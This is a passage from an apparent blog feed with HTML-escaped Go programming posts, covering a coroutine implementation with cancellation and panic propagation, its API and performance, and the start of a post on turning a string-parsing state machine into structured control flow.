style=&#34;color: #aaa&#34;&gt;    resume = func(in In) (out Out, ok bool) {&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        if !running {&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;            return&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        }&lt;/span&gt;&#xA;        cin &amp;lt;- msg[In]{val: in}&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        m := &amp;lt;-cout&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        if m.panic != nil {&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;            panic(m.panic)&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        }&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        return m.val, running&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    }&lt;/span&gt;&#xA;    cancel = func() {&#xA;        e := fmt.Errorf(&amp;#34;%w&amp;#34;, ErrCanceled) // unique wrapper&#xA;        cin &amp;lt;- msg[In]{panic: e}&#xA;        m := &amp;lt;-cout&#xA;        if m.panic != nil &amp;amp;&amp;amp; m.panic != e {&#xA;            panic(m.panic)&#xA;        }&#xA;    }&#xA;    yield := func(out Out) In {&#xA;        cout &amp;lt;- msg[Out]{val: out}&#xA;        m := &amp;lt;-cin&#xA;        if m.panic != nil {&#xA;            panic(m.panic)&#xA;        }&#xA;        return m.val&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    }&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    go func() {&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        defer func() {&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;            if running {&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;                running = false&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;                cout &amp;lt;- msg[Out]{panic: recover()}&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;            }&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        }()&lt;/span&gt;&#xA;        var out Out&#xA;        m := &amp;lt;-cin&#xA;        if m.panic == nil {&#xA;            out = f(m.val, yield)&#xA;        }&#xA;        running = false&#xA;        cout &amp;lt;- msg[Out]{val: out}&#xA;    }()&#xA;    return resume, cancel&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;}&lt;/span&gt;&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;We could change &lt;code&gt;Pull&lt;/code&gt; to use panics to cancel iterators as well,&#xA;but in that context the explicit &lt;code&gt;bool&lt;/code&gt; seems clearer,&#xA;especially since stopping an iterator is unexceptional.&#xA;&lt;a class=anchor href=&#34;#sieve2&#34;&gt;&lt;h2 id=&#34;sieve2&#34;&gt;Example: Prime Sieve Revisited&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Let’s look at how panic propagation and cancellation make cleanup of the prime sieve “just work”.&#xA;First let’s update the sieve to use the new API.&#xA;The &lt;code&gt;counter&lt;/code&gt; and &lt;code&gt;filter&lt;/code&gt; functions are already&#xA;“one-line” &lt;code&gt;return coro.New(...)&lt;/code&gt; calls.&#xA;They change signature to include the additional cancel func returned from &lt;code&gt;coro.New&lt;/code&gt;:&#xA;&lt;pre&gt;func counter() (func(bool) (int, bool), func()) {&#xA;    return coro.New(...)&#xA;}&#xA;&#xA;func filter(p int, next func(bool) (int, bool)) (func(bool) (int, bool), func()) {&#xA;    return coro.New(...)&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Then let’s convert the &lt;code&gt;main&lt;/code&gt; function to be a &lt;code&gt;primes&lt;/code&gt; function that prints &lt;code&gt;n&lt;/code&gt; primes (&lt;a href=&#34;https://go.dev/play/p/XWV8ACRKjDS&#34;&gt;full code&lt;/a&gt;):&#xA;&lt;pre&gt;func primes(n int) {&#xA;    next, cancel := counter()&#xA;    defer cancel()&#xA;    for i := 0; i &amp;lt; n; i++ {&#xA;        p, _ := next(true)&#xA;        fmt.Println(p)&#xA;        next, cancel = filter(p, next)&#xA;        defer cancel()&#xA;    }&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;When this function runs, after it has gotten &lt;code&gt;n&lt;/code&gt; primes, it returns.&#xA;Each of the deferred &lt;code&gt;cancel&lt;/code&gt; calls cleans up the&#xA;coroutines that were created.&#xA;And what if one of the coroutines has a bug and panics?&#xA;If the coroutine was resumed by a &lt;code&gt;next&lt;/code&gt; call in &lt;code&gt;primes&lt;/code&gt;,&#xA;then the panic comes back to &lt;code&gt;primes&lt;/code&gt;, and &lt;code&gt;primes&lt;/code&gt;’s deferred&#xA;&lt;code&gt;cancel&lt;/code&gt; calls clean up all the other coroutines.&#xA;If the coroutine was resumed by a &lt;code&gt;next&lt;/code&gt; call in a &lt;code&gt;filter&lt;/code&gt; coroutine,&#xA;then the panic will propagate up to the waiting &lt;code&gt;filter&lt;/code&gt; coroutine&#xA;and then the next waiting &lt;code&gt;filter&lt;/code&gt; coroutine, and so on, until it&#xA;gets to the &lt;code&gt;p&lt;/code&gt; &lt;code&gt;:=&lt;/code&gt; &lt;code&gt;next(true)&lt;/code&gt; in &lt;code&gt;primes&lt;/code&gt;, which will&#xA;again clean up the remaining coroutines.&#xA;&lt;a class=anchor href=&#34;#api&#34;&gt;&lt;h2 id=&#34;api&#34;&gt;API&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The API we’ve arrived at is:&lt;blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;New creates a new, paused coroutine ready to run the function f.&#xA;The new coroutine is a goroutine that never runs on its own:&#xA;it only runs while some other goroutine invokes and waits for it,&#xA;by calling resume or cancel.&#xA;&#xA;&lt;p&gt;&#xA;A goroutine can pause itself and switch to the new coroutine by calling resume(in).&#xA;The first call to resume starts f(in, yield).&#xA;Resume blocks while f runs, until either f calls yield(out) or returns out.&#xA;When f calls yield, yield blocks and resume returns out, true.&#xA;When f returns, resume returns out, false.&#xA;When resume has returned due to a yield, the next resume(in)&#xA;switches back to f, with yield returning in.&#xA;&#xA;&lt;p&gt;&#xA;Cancel stops the execution of f and shuts down the coroutine.&#xA;If resume has not been called,&#xA;then f does not run at all.&#xA;Otherwise, cancel causes the blocked yield call&#xA;to panic with an error satisfying errors.Is(err, ErrCanceled).&#xA;&#xA;&lt;p&gt;&#xA;If f panics and does not recover the panic,&#xA;the panic is stopped in f’s coroutine and restarted in the goroutine&#xA;waiting for f, by causing the blocked resume or cancel that is waiting&#xA;to re-panic with the same panic value.&#xA;Cancel does not re-panic when f’s panic is one that&#xA;cancel itself triggered.&#xA;&#xA;&lt;p&gt;&#xA;Once f has returned or panicked, the coroutine no longer exists.&#xA;Subsequent calls to resume return zero, false.&#xA;Subsequent calls to cancel simply return.&#xA;&#xA;&lt;p&gt;&#xA;The functions resume, cancel, and yield can be passed between&#xA;and used by different goroutines, in effect dynamically changing&#xA;which goroutine is “the coroutine.”&#xA;Although New creates a new goroutine, it also establishes an&#xA;invariant that one goroutine is always blocked,&#xA;either in resume, cancel, yield, or (right after New)&#xA;waiting for the resume that will call f.&#xA;This invariant holds until f returns, at which point the&#xA;new goroutine is shut down.&#xA;The net result is that coro.New creates new concurrency in the program&#xA;without any new parallelism.&#xA;&#xA;&lt;p&gt;&#xA;If multiple goroutines call resume or cancel, those calls are serialized.&#xA;Similarly, if multiple goroutines call yield, those calls are serialized.&lt;/blockquote&gt;&#xA;&lt;pre&gt;func New[In, Out any](f func(in In, yield func(Out) In) Out) (resume func(In) (Out, bool), cancel func())&#xA;&lt;/pre&gt;&#xA;&lt;a class=anchor href=&#34;#efficiency&#34;&gt;&lt;h2 id=&#34;efficiency&#34;&gt;Efficiency&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;As I said at the start, while it’s important to have a definition of coroutines&#xA;that can be understood by reference to a pure Go implementation,&#xA;I believe we should use an optimized runtime implementation.&#xA;On my 2019 MacBook Pro, passing values back and&#xA;forth using the channel-based &lt;code&gt;coro.New&lt;/code&gt; in this post requires&#xA;approximately 190ns per switch, or 380ns per value in &lt;code&gt;coro.Pull&lt;/code&gt;.&#xA;Remember that &lt;code&gt;coro.Pull&lt;/code&gt; would not be the standard way&#xA;to use an iterator: the standard way would be to invoke the iterator&#xA;directly, which has no coroutine overhead at all.&#xA;You only need &lt;code&gt;coro.Pull&lt;/code&gt; when you want to process&#xA;iterated values incrementally, not using a single for loop.&#xA;Even so, we want to make &lt;code&gt;coro.Pull&lt;/code&gt; as fast as we can.&#xA;&#xA;&lt;p&gt;&#xA;First I tried having the compiler mark send-receive pairs&#xA;and leave hints for the runtime to fuse them into a single operation.&#xA;That would let the channel runtime bypass the scheduler&#xA;and jump directly to the other coroutine.&#xA;This implementation requires&#xA;about 118ns per switch, or 236ns per pulled value (38% faster).&#xA;That’s better, but it’s still not as fast as I would like.&#xA;The full generality of channels is adding too much overhead.&#xA;&#xA;&lt;p&gt;&#xA;Next I added a direct coroutine switch to the runtime,&#xA;avoiding channels entirely.&#xA;That cuts the coroutine switch to three atomic compare-and-swaps&#xA;(one in the coroutine data structure, one for the scheduler status&#xA;of the blocking coroutine, and one for the scheduler status of the resuming coroutine),&#xA;which I believe is optimal given the safety invariants that must be maintained.&#xA;That implementation takes 20ns per switch, or 40ns per pulled value.&#xA;This is about 10X faster than the original channel implementation.&#xA;Perhaps more importantly, 40ns per pulled value seems small enough&#xA;in absolute terms not to be a bottleneck for code that needs &lt;code&gt;coro.Pull&lt;/code&gt;.&#xA;</content>
  </entry>
  <entry>
    <title>Storing Data in Control Flow</title>
    <id>tag:research.swtch.com,2012:research.swtch.com/pcdata</id>
    <link rel="alternate" href="http://research.swtch.com/pcdata"></link>
    <published>2023-07-11T14:00:00-04:00</published>
    <updated>2023-07-11T14:02:00-04:00</updated>
    <summary type="text">Write programs, not simulations of programs.</summary>
    <content type="html">&#xA;&#xA;&lt;p&gt;&#xA;A decision that arises over and over when designing concurrent programs&#xA;is whether to represent program state in control flow or as data.&#xA;This post is about what that decision means and how to approach it.&#xA;Done well, taking program state stored in data&#xA;and storing it instead in control flow can make programs&#xA;much clearer and more maintainable than they otherwise would be.&#xA;&#xA;&lt;p&gt;&#xA;Before saying much more, it’s important to note that&#xA;&lt;a href=&#34;https://www.youtube.com/watch?v=oV9rvDllKEg&#34;&gt;concurrency is not parallelism.&lt;/a&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Concurrency is about &lt;i&gt;how you write programs&lt;/i&gt;,&#xA;about being able to compose independently executing control flows,&#xA;whether you call them processes or threads or goroutines,&#xA;so that your program can be &lt;i&gt;dealing with&lt;/i&gt; lots of things at once without turning into a giant mess.&#xA;&lt;li&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;On the other hand, parallelism is about &lt;i&gt;how you execute programs&lt;/i&gt;,&#xA;allowing multiple computations to run simultaneously,&#xA;so that your program can be &lt;i&gt;doing&lt;/i&gt; lots of things at once efficiently.&lt;/ul&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Concurrency lends itself naturally to parallel execution,&#xA;but the focus in this post is about how to use concurrency&#xA;to write cleaner programs, not faster ones.&#xA;&#xA;&lt;p&gt;&#xA;The difference between concurrent programs and non-concurrent programs&#xA;is that concurrent programs can be written as if they are executing multiple&#xA;independent control flows at the same time.&#xA;The name for the smaller control flows varies by language:&#xA;thread, task, process, fiber, coroutine, goroutine, and so on.&#xA;No matter the name, the fundamental point for this post&#xA;is that writing a program in terms of multiple independently executing control flows&#xA;allows you to store program state in the execution state of one or more&#xA;of those control flows, specifically in the program counter&#xA;(which line is executing in that piece)&#xA;and on the stack.&#xA;Control flow state can always be maintained as explicit data instead,&#xA;but then the explicit data form is essentially simulating the control flow.&#xA;Most of the time, using the control flow features built into a programming language&#xA;is easier to understand, reason about, and maintain than simulating them&#xA;in data structures.&#xA;&#xA;&lt;p&gt;&#xA;The rest of this post illustrates the rather abstract claims I’ve been making&#xA;about storing data in control flow by walking through some&#xA;concrete examples.&#xA;They happen to be written in &lt;a href=&#34;https://go.dev/&#34;&gt;Go&lt;/a&gt;,&#xA;but the ideas apply to any language that supports writing concurrent programs,&#xA;including essentially every modern language.&#xA;&lt;a class=anchor href=&#34;#step&#34;&gt;&lt;h2 id=&#34;step&#34;&gt;A Step-by-Step Example&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Here is a seemingly trivial problem&#xA;that demonstrates what it means to store program state in control flow.&#xA;Suppose we are reading characters from a file and want to scan over a C-style double-quoted string.&#xA;In this case, we have a non-parallel program.&#xA;There is no opportunity for parallelism here,&#xA;but as we will see, concurrency can still play a useful part.&#xA;&#xA;&lt;p&gt;&#xA;If we don’t worry about checking the exact escape sequences in the string,&#xA;it suffices to match the regular expression &lt;code&gt;&#34;([^&#34;\\]|\\.)*&#34;&lt;/code&gt;,&#xA;which matches a double quote, then a sequence of zero or more characters,&#xA;and then another double quote.&#xA;Between the quotes, a character is anything that’s not a quote or backslash,&#xA;or else a backslash followed by anything (including a quote or backslash).&#xA;&#xA;&lt;p&gt;&#xA;Every regular expression can be compiled into finite automaton or state machine,&#xA;so we might use a tool to turn that specification into this Go code:&#xA;&lt;pre&gt;state := 0&#xA;for {&#xA;    c := read()&#xA;    switch state {&#xA;    case 0:&#xA;        if c != &#39;&#34;&#39; {&#xA;            return false&#xA;        }&#xA;        state = 1&#xA;    case 1:&#xA;        if c == &#39;&#34;&#39; {&#xA;            return true&#xA;        }&#xA;        if c == &#39;\\&#39; {&#xA;            state = 2&#xA;        } else {&#xA;            state = 1&#xA;        }&#xA;    case 2:&#xA;        state = 1&#xA;    }&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The code has a single variable named &lt;code&gt;state&lt;/code&gt; that represents the state of the automaton.&#xA;The for loop reads a character and updates the state, over and over,&#xA;until it finds either the end of the string or a syntax error.&#xA;This is the kind of code that a program would write and that only a program could love.&#xA;It’s difficult for people to read, and it will be difficult for people to maintain.&#xA;&#xA;&lt;p&gt;&#xA;The main reason this program is so opaque is that its program state is stored as data,&#xA;specifically in the variable named &lt;code&gt;state&lt;/code&gt;.&#xA;When it’s possible to store state in code instead, that often leads to a clearer program.&#xA;To see this, let’s transform the program, one small step at a time,&#xA;into an equivalent but much more understandable version.&#xA;&#xA;&lt;p&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;We can start by duplicating the &lt;code&gt;read&lt;/code&gt; calls into each case of the switch:&#xA;&lt;pre&gt;&lt;span style=&#34;color: #aaa&#34;&gt;state := 0                          state := 0&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;for {                               for {&lt;/span&gt;&#xA;    c := read()                     &#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    switch state {                      switch state {&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    case 0:                             case 0:&lt;/span&gt;&#xA;                                            c := read()&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        if c != &amp;#39;&amp;#34;&amp;#39; {                       if c != &amp;#39;&amp;#34;&amp;#39; {&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;            return false                        return false&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        }                                   }&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        state = 1                           state = 1&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    case 1:                             case 1:&lt;/span&gt;&#xA;                                            c := read()&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        if c == &amp;#39;&amp;#34;&amp;#39; {                       if c == &amp;#39;&amp;#34;&amp;#39; {&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;            return true                         return true&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        }                                   }&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        if c == &amp;#39;\\&amp;#39; {                      if c == &amp;#39;\\&amp;#39; {&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;            state = 2                           state = 2&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        } else {                            } else {&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;            state = 1                           state = 1&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        }                                   }&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    case 2:                             case 2:&lt;/span&gt;&#xA;                                            c := read()&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        state = 1                           state = 1&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    }                                   }&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;}                                   }&lt;/span&gt;&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;(In this and all the displays that follow, the old program is on the left, the new program&#xA;is on the right, and lines that haven’t changed are printed in gray text.)&#xA;&#xA;&lt;p&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Now, instead of writing to &lt;code&gt;state&lt;/code&gt; and then immediately going around the for loop again&#xA;to look up what to do in that state, we can use code labels and goto statements:&#xA;&lt;pre&gt;state := 0                          state0:&#xA;for {                               &#xA;    switch state {                  &#xA;    case 0:                         &#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        c := read()                     c := read()&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        if c != &amp;#39;&amp;#34;&amp;#39; {                   if c != &amp;#39;&amp;#34;&amp;#39; {&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;            return false                    return false&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        }                               }&lt;/span&gt;&#xA;        state = 1                       goto state1&#xA;    case 1:                         state1:&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        c := read()                     c := read()&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        if c == &amp;#39;&amp;#34;&amp;#39; {                   if c == &amp;#39;&amp;#34;&amp;#39; {&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;            return true                     return true&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        }                               }&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        if c == &amp;#39;\\&amp;#39; {                  if c == &amp;#39;\\&amp;#39; {&lt;/span&gt;&#xA;            state = 2                       goto state2&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        } else {                        } else {&lt;/span&gt;&#xA;            state = 1                       goto state1&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        }                               }&lt;/span&gt;&#xA;    case 2:                         state2:&#xA;        c := read()                     read()&#xA;        state = 1                       goto state1&#xA;    }                               &#xA;}                                   &#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Then we can simplify the program further.&#xA;The &lt;code&gt;goto&lt;/code&gt; &lt;code&gt;state1&lt;/code&gt; right before the &lt;code&gt;state1&lt;/code&gt; label is a no-op and can be deleted.&#xA;And we can see that there’s only one way to get to state2,&#xA;so we might as well replace the &lt;code&gt;goto&lt;/code&gt; &lt;code&gt;state2&lt;/code&gt; with the actual code from state2:&#xA;&lt;pre&gt;&lt;span style=&#34;color: #aaa&#34;&gt;state0:                         state0:&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    c := read()                     c := read()&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    if c != &amp;#39;&amp;#34;&amp;#39; {                   if c != &amp;#39;&amp;#34;&amp;#39; {&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        return false                    return false&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    }                               }&lt;/span&gt;&#xA;    goto state1                 &#xA;&lt;span style=&#34;color: #aaa&#34;&gt;state1:                         state1:&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    c := read()                     c := read()&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    if c == &amp;#39;&amp;#34;&amp;#39; {                   if c == &amp;#39;&amp;#34;&amp;#39; {&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        return true                     return true&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    }                               }&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    if c == &amp;#39;\\&amp;#39; {                  if c == &amp;#39;\\&amp;#39; {&lt;/span&gt;&#xA;        goto state2             &#xA;    } else {                    &#xA;        goto state1             &#xA;    }                           &#xA;state2:                         &#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    read()                              read()&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    goto state1                         goto state1&lt;/span&gt;&#xA;                                    } else {&#xA;                                        goto state1&#xA;                                    }&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Then we can factor the “goto state1” out of both branches of the if statement.&#xA;&lt;pre&gt;&lt;span style=&#34;color: #aaa&#34;&gt;state0:                         state0:&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    c := read()                     c := read()&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    if c != &amp;#39;&amp;#34;&amp;#39; {                   if c != &amp;#39;&amp;#34;&amp;#39; {&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        return false                    return false&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    }                               }&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;                                &lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;state1:                         state1:&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    c := read()                     c := read()&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    if c == &amp;#39;&amp;#34;&amp;#39; {                   if c == &amp;#39;&amp;#34;&amp;#39; {&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        return true                     return true&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    }                               }&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    if c == &amp;#39;\\&amp;#39; {                  if c == &amp;#39;\\&amp;#39; {&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        read()                          read()&lt;/span&gt;&#xA;        goto state1                 }&#xA;    } else {                        goto state1&#xA;        goto state1             &#xA;    }                           &#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Then we can drop the unused &lt;code&gt;state0&lt;/code&gt; label and replace the &lt;code&gt;state1&lt;/code&gt; loop with an actual loop.&#xA;Now we have something that looks like a real program:&#xA;&lt;pre&gt;state0:                         &#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    c := read()                 c := read()&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    if c != &amp;#39;&amp;#34;&amp;#39; {               if c != &amp;#39;&amp;#34;&amp;#39; {&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        return false                return false&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    }                           }&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;                                &lt;/span&gt;&#xA;state1:                         for {&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    c := read()                     c := read()&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    if c == &amp;#39;&amp;#34;&amp;#39; {                   if c == &amp;#39;&amp;#34;&amp;#39; {&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        return true                     return true&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    }                               }&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    if c == &amp;#39;\\&amp;#39; {                  if c == &amp;#39;\\&amp;#39; {&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        read()                          read()&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    }                               }&lt;/span&gt;&#xA;    goto state1                 }&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;We can simplify a little further, eliminating some unnecessary variables,&#xA;and we can make the check for the final quote (&lt;code&gt;c&lt;/code&gt; &lt;code&gt;==&lt;/code&gt; &lt;code&gt;&#34;&#34;&lt;/code&gt;) be the loop terminator.&#xA;&lt;pre&gt;c := read()                     if read() != &amp;#39;&amp;#34;&amp;#39; {&#xA;if c != &amp;#39;&amp;#34;&amp;#39; {                   &#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    return false                    return false&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;}                               }&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;                                &lt;/span&gt;&#xA;for {                           var c byte&#xA;    c := read()                 for c != &amp;#39;&amp;#34;&amp;#39; {&#xA;    if c == &amp;#39;&amp;#34;&amp;#39; {                   c = read()&#xA;        return true             &#xA;    }                           &#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    if c == &amp;#39;\\&amp;#39; {                  if c == &amp;#39;\\&amp;#39; {&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        read()                          read()&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    }                               }&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;}                               }&lt;/span&gt;&#xA;                                return true&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The final version is:&#xA;&lt;pre&gt;func parseQuoted(read func() byte) bool {&#xA;    if read() != &#39;&#34;&#39; {&#xA;        return false&#xA;    }&#xA;    var c byte&#xA;    for c != &#39;&#34;&#39; {&#xA;        c = read()&#xA;        if c == &#39;\\&#39; {&#xA;            read()&#xA;        }&#xA;    }&#xA;    return true&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Earlier I explained the regular expression by saying it&#xA;“matches a double quote, then a sequence of zero or more characters,&#xA;and then another double quote.&#xA;Between the quotes, a character is anything that’s not a quote or backslash,&#xA;or else a backslash followed by anything.”&#xA;It’s easy to see that this program does exactly that.&#xA;&#xA;&lt;p&gt;&#xA;Hand-written programs can have opportunities to use control flow too.&#xA;For example, here is a version that a person might have written by hand:&#xA;&lt;pre&gt;if read() != &#39;&#34;&#39; {&#xA;    return false&#xA;}&#xA;inEscape := false&#xA;for {&#xA;    c := read()&#xA;    if inEscape {&#xA;        inEscape = false&#xA;        continue&#xA;    }&#xA;    if c == &#39;&#34;&#39; {&#xA;        return true&#xA;    }&#xA;    if c == &#39;\\&#39; {&#xA;        inEscape = true&#xA;    }&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The same kinds of small steps can be used to convert the boolean variable&#xA;&lt;code&gt;inEscape&lt;/code&gt; from data to control flow,&#xA;ending at the same cleaned up version.&#xA;&#xA;&lt;p&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Either way, the &lt;code&gt;state&lt;/code&gt; variable in the original is now implicitly represented&#xA;by the program counter, meaning which part of the program is executing.&#xA;The comments in this version indicate the implicit value of the original’s&#xA;&lt;code&gt;state&lt;/code&gt; (or &lt;code&gt;inEscape&lt;/code&gt;) variables:&#xA;&lt;pre&gt;&lt;span style=&#34;color: #aaa&#34;&gt;func parseQuoted(read func() byte) bool {&lt;/span&gt;&#xA;    // state == 0&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    if read() != &amp;#39;&amp;#34;&amp;#39; {&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        return false&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    }&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    var c byte&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    for c != &amp;#39;&amp;#34;&amp;#39; {&lt;/span&gt;&#xA;        // state == 1 (inEscape = false)&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        c = read()&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        if c == &amp;#39;\\&amp;#39; {&lt;/span&gt;&#xA;            // state == 2 (inEscape = true)&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;            read()&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        }&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    }&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    return true&lt;/span&gt;&#xA;&lt;span style=&#34;color: 